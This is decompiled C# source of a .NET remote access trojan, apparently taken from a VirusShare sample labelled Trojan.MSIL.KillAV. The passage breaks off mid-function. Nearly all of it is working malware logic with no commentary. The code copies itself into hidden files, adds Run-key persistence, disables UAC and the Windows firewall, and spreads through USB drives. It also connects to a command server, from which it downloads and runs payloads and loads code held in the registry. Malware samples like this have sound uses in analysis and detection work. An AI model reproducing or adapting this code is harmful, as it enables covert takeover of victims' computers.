// Decompiled with JetBrains decompiler
// Type: nv.O
// Assembly: nv, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D9D26A5E-13B6-4DC4-B014-052E2F5FE723
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.KillAV.ao-71e232c7af7ac92395beadd9c8a364c7e48a0978a010598a9978211f4ebd3b5a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;
using nv.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace nv
{
  [StandardModule]
  public sealed class O
  {
    public static bool[] Bo = new bool[7];
    public static string[] ST = new string[6];
    public static string en;
    public static int ms;
    [AccessedThroughProperty("WC")]
    private static sk _WC;
    public static string Ai;
    public static string SU;
    public static string Uo;
    public static string sp;
    public static string mU;
    public static string FR;
    private static int c2;
    private static int cc;
    private static int c0;
    public static Mutex jm;
    [AccessedThroughProperty("B")]
    private static BackgroundWorker _B;
    public static Process fj;
    private static string u;
    private static string z;

    static O()
    {
      O.WC = new sk();
      O.SU = "*";
      O.Uo = "*";
      O.sp = "*";
      O.mU = "*";
      O.B = new BackgroundWorker();
      O.fj = new Process();
      O.u = O.Fp() + "\\" + Process.GetCurrentProcess().Id.ToString() + ".vbs";
      O.z = O.DEB(ref nv.My.Resources.Resources.Q.Split('.')[0]).Replace("NJP", O.ep()).Replace("NJF", Conversions.ToString(Process.GetCurrentProcess().Id));
    }

    public static sk WC
    {
      get => O._WC;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        sk.O1EventHandler o1EventHandler = new sk.O1EventHandler(O.W3);
        sk.O2EventHandler o2EventHandler = new sk.O2EventHandler(O.W2);
        sk.O0EventHandler o0EventHandler = new sk.O0EventHandler(O.W0);
        if (O._WC != null)
        {
          O._WC.O1 -= o1EventHandler;
          O._WC.O2 -= o2EventHandler;
          O._WC.O0 -= o0EventHandler;
        }
        O._WC = value;
        if (O._WC == null)
          return;
        O._WC.O1 += o1EventHandler;
        O._WC.O2 += o2EventHandler;
        O._WC.O0 += o0EventHandler;
      }
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SetProcessWorkingSetSize(
      IntPtr process,
      int minimumWorkingSetSize,
      int maximumWorkingSetSize);

    public static void E()
    {
      try
      {
        while (true)
        {
          do
          {
            Thread.Sleep(10000);
            GC.Collect();
            GC.WaitForPendingFinalizers();
          }
          while (Environment.OSVersion.Platform != PlatformID.Win32NT);
          O.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void R()
    {
      MemoryStream memoryStream1 = new MemoryStream();
      Array Instance1 = (Array) File.ReadAllBytes(O.ep());
      int num1 = checked (Instance1.Length - 400);
      int num2 = checked (Instance1.Length - 1);
      int num3 = num1;
      while (num3 <= num2)
      {
        int num4;
        if (Operators.CompareString(Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
        {
          (object) num3
        }, (string[]) null)))) + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
        {
          (object) checked (num3 - 1)
        }, (string[]) null)))) + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
        {
          (object) checked (num3 - 2)
        }, (string[]) null)))), "***", false) == 0)
          num4 = checked (num3 + 1);
        int num5;
        if (Operators.CompareString(Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
        {
          (object) num3
        }, (string[]) null)))) + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
        {
          (object) checked (num3 - 1)
        }, (string[]) null)))) + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
        {
          (object) checked (num3 - 2)
        }, (string[]) null)))), "^^^", false) == 0)
          num5 = checked (num3 - 3);
        if (num4 > 0 & num5 == 0)
          memoryStream1.WriteByte(Conversions.ToByte(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
          {
            (object) num3
          }, (string[]) null)));
        checked { ++num3; }
      }
      byte[] array1 = memoryStream1.ToArray();
      MemoryStream memoryStream2 = new MemoryStream();
      memoryStream2.Write(array1, 1, checked (array1.Length - 3));
      Encoding encoding = Encoding.Default;
      byte[] array2 = memoryStream2.ToArray();
      bool flag = false;
      ref bool local1 = ref flag;
      byte[] bytes = O.ZIP(array2, ref local1);
      Array Instance2 = (Array) Strings.Split(encoding.GetString(bytes), O.ST[1]);
      O.ST[5] = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 0
      }, (string[]) null));
      O.SU = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 1
      }, (string[]) null));
      if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 2
      }, (string[]) null), (object) "*", false))
      {
        O.Ai = "*";
      }
      else
      {
        O.Ai = Interaction.Environ(Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
        {
          (object) 2
        }, (string[]) null)), ":")[1]) + "\\" + Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
        {
          (object) 2
        }, (string[]) null)), ":")[0];
        if (Operators.CompareString(O.Ai, O.ep(), false) != 0)
        {
          try
          {
            if (File.Exists(O.Ai))
              File.Delete(O.Ai);
            File.Copy(O.ep(), O.Ai, true);
            try
            {
              File.SetAttributes(O.Ai, FileAttributes.Hidden);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            if (Operators.CompareString(Conversions.ToString(Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
            {
              (object) 2
            }, (string[]) null)), ":")[2][0]), "T", false) == 0)
            {
              string ai = O.Ai;
              string s = O.ep();
              string arguments = "Kill@" + O.ENB(ref s);
              Process.Start(ai, arguments);
            }
            else
              Process.Start(O.Ai);
            ProjectData.EndApp();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.EndApp();
            ProjectData.ClearProjectError();
          }
        }
      }
      if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 3
      }, (string[]) null), (object) "^", false))
        O.Bo[6] = true;
      if (Strings.InStr(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 4
      }, (string[]) null)), "*") == 0)
      {
        O.Uo = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
        {
          (object) 4
        }, (string[]) null));
        new Thread((ParameterizedThreadStart) (a0 => O.USb(Conversions.ToString(a0)))).Start((object) O.Uo);
        O.sp = "(" + O.Uo + ")USB,";
      }
      O.mU = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 5
      }, (string[]) null));
      try
      {
        Mutex.OpenExisting(O.mU);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      O.jm = new Mutex(true, O.mU);
      Registry.CurrentUser.CreateSubKey(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 8
      }, (string[]) null)));
      NK.Key = Conversions.ToString(Operators.ConcatenateObject((object) "HKEY_CURRENT_USER\\Software\\", NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 8
      }, (string[]) null)));
      string[] st = O.ST;
      string str1 = "vname";
      ref string local2 = ref str1;
      Array Instance3 = Instance2;
      object[] objArray1 = new object[1];
      object[] objArray2 = objArray1;
      int num6 = 7;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num6;
      objArray2[0] = (object) local3;
      object[] Arguments = objArray1;
      string str2 = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance3, Arguments, (string[]) null));
      ref string local4 = ref str2;
      string str3 = NK.GetValue(ref local2, ref local4);
      NewLateBinding.LateIndexSetComplex((object) Instance2, new object[2]
      {
        (object) num6,
        (object) str2
      }, (string[]) null, true, false);
      st[2] = str3;
      if (!Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
      {
        (object) 9
      }, (string[]) null), (object) "^", false))
        return;
      new Thread(new ThreadStart(O.fwb)).Start();
    }

    public static void fwb()
    {
      try
      {
        byte[] p = nv.My.Resources.Resources.P;
        bool flag = false;
        ref bool local1 = ref flag;
        byte[] numArray = O.ZIP(p, ref local1);
        ref byte[] local2 = ref numArray;
        string str1 = "P.V";
        ref string local3 = ref str1;
        string str2 = "main";
        ref string local4 = ref str2;
        object obj = (object) null;
        ref object local5 = ref obj;
        O.inv(ref local2, ref local3, ref local4, ref local5);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void x(byte[] B)
    {
      try
      {
        byte[] B1 = B;
        bool flag = false;
        ref bool local = ref flag;
        Assembly.Load(O.ZIP(B1, ref local)).EntryPoint.Invoke((object) null, new object[0]);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          byte[] B2 = B;
          bool flag = false;
          ref bool local = ref flag;
          Assembly.Load(O.ZIP(B2, ref local)).EntryPoint.Invoke((object) null, new object[1]
          {
            (object) new string[0]
          });
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
    }

    [STAThread]
    public static void main()
    {
      try
      {
        string Expression = Interaction.Command();
        if (Expression.Length > 0)
        {
          Array Instance1 = (Array) Strings.Split(Expression, "@");
          object Left = NewLateBinding.LateIndexGet((object) Instance1, new object[1]
          {
            (object) 0
          }, (string[]) null);
          if (Operators.ConditionalCompareObjectEqual(Left, (object) "!0", false))
          {
            Thread.Sleep(100);
            try
            {
              Process.GetProcessById(Conversions.ToInteger(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
              {
                (object) 2
              }, (string[]) null))).Kill();
              Process[] processesByName = Process.GetProcessesByName("wscript");
              int index = 0;
              while (index < processesByName.Length)
              {
                Process process = processesByName[index];
                try
                {
                  process.Kill();
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
                checked { ++index; }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              File.Delete(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
              {
                (object) 1
              }, (string[]) null)));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              MyProject.Computer.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
              {
                (object) 2
              }, (string[]) null)));
              MyProject.Computer.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
              {
                (object) 2
              }, (string[]) null)));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.ConditionalCompareObjectEqual(Left, (object) "..", false))
            Thread.Sleep(2000);
          else if (Operators.ConditionalCompareObjectEqual(Left, (object) "Kill", false))
          {
            try
            {
              Array Instance2 = Instance1;
              object[] objArray1 = new object[1];
              object[] objArray2 = objArray1;
              int num = 1;
              // ISSUE: variable of a boxed type
              __Boxed<int> local = (ValueType) num;
              objArray2[0] = (object) local;
              object[] Arguments = objArray1;
              string s = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, Arguments, (string[]) null));
              string path = O.DEB(ref s);
              NewLateBinding.LateIndexSetComplex((object) Instance1, new object[2]
              {
                (object) num,
                (object) s
              }, (string[]) null, true, false);
              File.Delete(path);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        byte[] parameter = (byte[]) MyProject.Computer.Registry.CurrentUser.GetValue("p161", (object) new byte());
        if (parameter != null)
        {
          Thread thread = new Thread((ParameterizedThreadStart) (a0 => O.x((byte[]) a0)));
          thread.Start((object) parameter);
          do
          {
            Thread.Sleep(1);
          }
          while (thread.IsAlive);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        O.ST[0] = Interaction.Environ("temp") + "\\";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      O.ST[1] = "^:^";
      O.ST[2] = "VmljdGlt";
      O.ST[3] = "X";
      O.ST[4] = "1.6.1";
      O.ST[5] = "127.0.0.1:7";
      try
      {
        O.en = Process.GetCurrentProcess().ProcessName;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        O.en = "!";
        ProjectData.ClearProjectError();
      }
      try
      {
        O.ST[3] = Environment.MachineName + "\\" + Environment.UserName;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.ClassesRoot.GetValue("!", (object) null), (object) null, false))
        {
          O.FR = Conversions.ToString(MyProject.Computer.Clock.LocalTime) + " >> " + O.ep();
          MyProject.Computer.Registry.ClassesRoot.SetValue("!", (object) O.ENB(ref O.FR));
        }
        else
        {
          string s = Conversions.ToString(MyProject.Computer.Registry.ClassesRoot.GetValue("!", (object) "*"));
          O.FR = O.DEB(ref s);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        O.FR = "*";
        ProjectData.ClearProjectError();
      }
      try
      {
        O.R();
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        O.SU = "*";
        O.mU = "*";
        try
        {
          NK.Key = "HKEY_CURRENT_USER\\Software\\nKey";
          string[] st = O.ST;
          string N = "vname";
          string str = NK.GetValue(ref N, ref O.ST[2]);
          st[2] = str;
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
      try
      {
        string str1 = "FT";
        ref string local1 = ref str1;
        string str2 = "";
        ref string local2 = ref str2;
        if (Operators.CompareString(NK.GetValue(ref local1, ref local2), "", false) == 0)
        {
          O.Bo[0] = true;
          str2 = "FT";
          ref string local3 = ref str2;
          string str3 = "&";
          ref string local4 = ref str3;
          NK.SetValue(ref local3, ref local4);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      O.cc = 4;
      if (O.Bo[6])
        O.B.RunWorkerAsync();
      new Thread(new ThreadStart(O.E)).Start();
      try
      {
        MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object) 0, RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      O.con();
      while (true)
      {
        Thread.Sleep(1000);
        try
        {
          checked { ++O.cc; }
          checked { ++O.c0; }
          if (O.c2 < 5)
            checked { ++O.c2; }
          if (O.c2 == 5)
          {
            try
            {
              Process[] processesByName1 = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
              int index1 = 0;
              while (index1 < processesByName1.Length)
              {
                Process process1 = processesByName1[index1];
                try
                {
                  if (FileSystem.FileLen(process1.MainModule.FileName) == FileSystem.FileLen(Process.GetCurrentProcess().MainModule.FileName))
                  {
                    if (process1.Id != Process.GetCurrentProcess().Id)
                    {
                      try
                      {
                        process1.Kill();
                        Process[] processesByName2 = Process.GetProcessesByName("wscript");
                        int index2 = 0;
                        while (index2 < processesByName2.Length)
                        {
                          Process process2 = processesByName2[index2];
                          try
                          {
                            process2.Kill();
                          }
                          catch (Exception ex)
                          {
                            ProjectData.SetProjectError(ex);
                            ProjectData.ClearProjectError();
                          }
                          checked { ++index2; }
                        }
                      }
                      catch (Exception ex)
                      {
                        ProjectData.SetProjectError(ex);
                        ProjectData.ClearProjectError();
                      }
                    }
                  }
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
                checked { ++index1; }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          if (Operators.CompareString(O.SU, "*", false) != 0)
          {
            if (O.cc > 4)
            {
              try
              {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (Operators.ConditionalCompareObjectEqual(registryKey.GetValue(O.SU), (object) null, false))
                  registryKey.SetValue(O.SU, (object) (O.ep() + " @.."));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              try
              {
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (Operators.ConditionalCompareObjectEqual(registryKey.GetValue(O.SU), (object) null, false))
                  registryKey.SetValue(O.SU, (object) O.ep());
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              O.cc = 0;
            }
          }
          if (!O.Bo[5])
          {
            try
            {
              if (O.WC.CNT())
              {
                if (O.Bo[4])
                {
                  if (O.Bo[0] & !O.Bo[2])
                  {
                    O.Bo[2] = true;
                    string T = "#blue";
                    O.SEND(ref T);
                  }
                }
              }
              else
              {
                O.Dis();
                O.con();
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              O.Dis();
              O.con();
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static void con()
    {
      O.Bo[5] = true;
      try
      {
        O.Bo[3] = false;
        if (!O.Bo[1])
        {
          O.Bo[1] = true;
          try
          {
            Process.Start(new ProcessStartInfo()
            {
              FileName = "netsh",
              Arguments = "firewall set opmode disable",
              CreateNoWindow = true,
              WindowStyle = ProcessWindowStyle.Hidden
            });
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        O.WC = new sk();
        O.WC.CN(Strings.Split(O.ST[5], ":")[0], Conversions.ToInteger(Strings.Split(O.ST[5], ":")[1]));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(2000);
      O.Bo[5] = false;
    }

    public static void Dis()
    {
      try
      {
        O.Bo[3] = true;
        O.Bo[4] = false;
        O.WC.DS();
        O.WC = (sk) null;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void SEND(ref string T)
    {
      try
      {
        O.WC.C1(O.WC.STB(T));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void W0()
    {
      try
      {
        string T = "#2" + O.ST[1] + O.A0() + O.ST[1] + O.ST[2] + "_.";
        O.SEND(ref T);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          string str = "X";
          int num = 0;
          do
          {
            str += "\r\nX";
            checked { ++num; }
          }
          while (num <= 5);
          string T = "#2" + O.ST[1] + str + O.ST[1] + O.ST[2] + "_ ";
          O.SEND(ref T);
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
      O.Bo[4] = true;
      Thread.Sleep(100);
      O.Bo[3] = false;
    }

    public static void W2()
    {
      O.Bo[3] = true;
      O.Bo[4] = false;
    }

    public static void W3(byte[] D) => O.WC.AT(D);

    public static string ep() => (AppDomain.CurrentDomain.BaseDirectory + "\\" + AppDomain.CurrentDomain.FriendlyName).Replace("\\\\", "\\");

    public static string Fp() => AppDomain.CurrentDomain.BaseDirectory;

    public static void ind(byte[] Da)
    {
      string Expression = O.WC.BTS(Da);
      try
      {
        Array Instance1 = (Array) Strings.Split(Expression, O.ST[1]);
        string Left = NewLateBinding.LateIndexGet((object) Instance1, new object[1]
        {
          (object) 0
        }, (string[]) null).ToString();
        if (Operators.CompareString(Left, "#X", false) == 0)
        {
          int offset = checked (8 + NewLateBinding.LateIndexGet((object) Instance1, new object[1]
          {
            unchecked ((object) 1)
          }, (string[]) null).ToString().Length);
          MemoryStream memoryStream = new MemoryStream();
          memoryStream.Write(Da, offset, checked (Da.Length - offset));
          byte[] array = memoryStream.ToArray();
          bool flag = false;
          ref bool local = ref flag;
          byte[] bytes = O.ZIP(array, ref local);
          int num = 0;
          do
          {
            if (File.Exists(Conversions.ToString(Operators.ConcatenateObject((object) (O.ST[0] + Conversions.ToString(num) + "."), NewLateBinding.LateIndexGet((object) Instance1, new object[1]
            {
              (object) 1
            }, (string[]) null)))))
            {
              try
              {
                File.Delete(Conversions.ToString(Operators.ConcatenateObject((object) (O.ST[0] + Conversions.ToString(num) + "."), NewLateBinding.LateIndexGet((object) Instance1, new object[1]
                {
                  (object) 1
                }, (string[]) null))));
                File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object) (O.ST[0] + Conversions.ToString(num) + "."), NewLateBinding.LateIndexGet((object) Instance1, new object[1]
                {
                  (object) 1
                }, (string[]) null))), bytes);
                NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
                {
                  Operators.ConcatenateObject((object) (O.ST[0] + Conversions.ToString(num) + "."), NewLateBinding.LateIndexGet((object) Instance1, new object[1]
                  {
                    (object) 1
                  }, (string[]) null))
                }, (string[]) null, (Type[]) null, (bool[]) null, true);
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              checked { ++num; }
            }
            else
            {
              File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object) (O.ST[0] + Conversions.ToString(num) + "."), NewLateBinding.LateIndexGet((object) Instance1, new object[1]
              {
                (object) 1
              }, (string[]) null))), bytes);
              NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
              {
                Operators.ConcatenateObject((object) (O.ST[0] + Conversions.ToString(num) + "."), NewLateBinding.LateIndexGet((object) Instance1, new object[1]
                {
                  (object) 1
                }, (string[]) null))
              }, (string[]) null, (Type[]) null, (bool[]) null, true);
              break;
            }
          }
          while (num <= 999);
        }
        else if (Operators.CompareString(Left, "##", false) == 0)
        {
          string T = "#Bla";
          O.SEND(ref T);
          MemoryStream memoryStream = new MemoryStream();
          memoryStream.Write(Da, 5, checked (Da.Length - 5));
          MyProject.Computer.Registry.CurrentUser.SetValue("p161", (object) memoryStream.ToArray());
          Process.Start(O.ep());
          ProjectData.EndApp();
        }
        else if (Operators.CompareString(Left, "#R", false) == 0)
        {
          string str1 = "vname";
          ref string local1 = ref str1;
          Array Instance2 = Instance1;
          object[] objArray1 = new object[1];
          object[] objArray2 = objArray1;
          int num = 1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num;
          objArray2[0] = (object) local2;
          object[] Arguments = objArray1;
          string str2 = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance2, Arguments, (string[]) null));
          ref string local3 = ref str2;
          NK.SetValue(ref local1, ref local3);
          NewLateBinding.LateIndexSetComplex((object) Instance1, new object[2]
          {
            (object) num,
            (object) str2
          }, (string[]) null, true, false);
          O.ST[2] = Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
          {
            (object) 1
          }, (string[]) null));
          string T = "#R" + O.ST[1] + O.ST[2];
          O.SEND(ref T);
        }
        else if (Operators.CompareString(Left, "p", false) == 0)
        {
          string T = "p";
          O.SEND(ref T);
        }
        else if (Operators.CompareString(Left, "#2", false) == 0)
        {
          string str = "." + Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
          {
            (object) 1
          }, (string[]) null)), ".")[checked (Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
          {
            unchecked ((object) 1)
          }, (string[]) null)), ".").Length - 1)];
          int num1 = 0;
          while (File.Exists(Interaction.Environ("appdata") + "\\" + Conversions.ToString(num1) + str))
          {
            try
            {
              File.Delete(Interaction.Environ("appdata") + "\\" + Conversions.ToString(num1) + str);
              int num2;
              checked { ++num2; }
              if (num2 > 5)
                return;
              continue;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            checked { ++num1; }
            if (num1 > 9999)
              return;
          }
          string fileName = Interaction.Environ("appdata") + "\\" + Conversions.ToString(num1) + str;
          Network network = MyProject.Computer.Network;
          object[] objArray3 = new object[2];
          object[] objArray4 = objArray3;
          Array Instance3 = Instance1;
          object[] objArray5 = new object[1];
          object[] objArray6 = objArray5;
          int num3 = 1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) num3;
          objArray6[0] = (object) local;
          object[] Arguments1 = objArray5;
          object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object) Instance3, Arguments1, (string[]) null));
          objArray4[0] = objectValue;
          objArray3[1] = (object) fileName;
          object[] objArray7 = objArray3;
          object[] Arguments2 = objArray7;
          bool[] flagArray = new bool[2]{ true, true };
          bool[] CopyBack = flagArray;
          NewLateBinding.LateCall((object) network, (Type) null, "DownloadFile", Arguments2, (string[]) null, (Type[]) null, CopyBack, true);
          if (flagArray[0])
            NewLateBinding.LateIndexSetComplex((object) Instance1, new object[2]
            {
              (object) num3,
              RuntimeHelpers.GetObjectValue(objArray7[0])
            }, (string[]) null, true, false);
          if (flagArray[1])
            fileName = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray7[1]), typeof (string));
          Process.Start(fileName);
        }
        else if (Operators.CompareString(Left, "#4", false) == 0)
        {
          try
          {
            O.B.Dispose();
            O.fj.Dispose();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          if (O.Bo[6])
          {
            try
            {
              Process[] processesByName = Process.GetProcessesByName("wscript");
              int index = 0;
              while (index < processesByName.Length)
              {
                Process process = processesByName[index];
                try
                {
                  process.Kill();
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
                checked { ++index; }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object) Instance1, new object[1]
          {
            (object) 1
          }, (string[]) null), (object) "!", false))
          {
            NK.CLEAR();
            try
            {
              DriveInfo[] drives = DriveInfo.GetDrives();
              int index = 0;
              while (index < drives.Length)
              {
                DriveInfo driveInfo = drives[index];
                if (driveInfo.IsReady)
                {
                  if (driveInfo.TotalFreeSpace > 0L)
                  {
                    try
                    {
                      if (File.Exists(driveInfo.Name + O.Uo))
                        File.Delete(driveInfo.Name + O.Uo);
                    }
                    catch (Exception ex)
                    {
                      ProjectData.SetProjectError(ex);
                      ProjectData.ClearProjectError();
                    }
                  }
                }
                checked { ++index; }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              File.WriteAllText(O.Fp() + "\\j.vbs", O.DEB(ref nv.My.Resources.Resources.Q.Split('.')[1]).Replace("NJ", O.ep()));
              Process.Start(O.Fp() + "\\j.vbs");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          ProjectData.EndApp();
        }
        else if (Operators.CompareString(Left, "#6", false) == 0)
        {
          try
          {
            O.B.Dispose();
            if (O.fj.Id > 1)
              O.fj.Kill();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          Process.Start(O.ep());
          ProjectData.EndApp();
        }
        else
        {
          if (Operators.CompareString(Left, "#29", false) != 0)
            return;
          string T = "#Bla";
          O.SEND(ref T);
          int num = 0;
          string str;
          while (File.Exists(O.ST[0] + Conversions.ToString(num) + ".exe"))
          {
            try
            {
              File.Delete(O.ST[0] + Conversions.ToString(num) + ".exe");
              str = O.ST[0] + Conversions.ToString(num) + ".exe";
              goto label_64;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            checked { ++num; }
            if (num > 999)
              goto label_64;
          }
          str = O.ST[0] + Conversions.ToString(num) + ".exe";
label_64:
          string path = str;
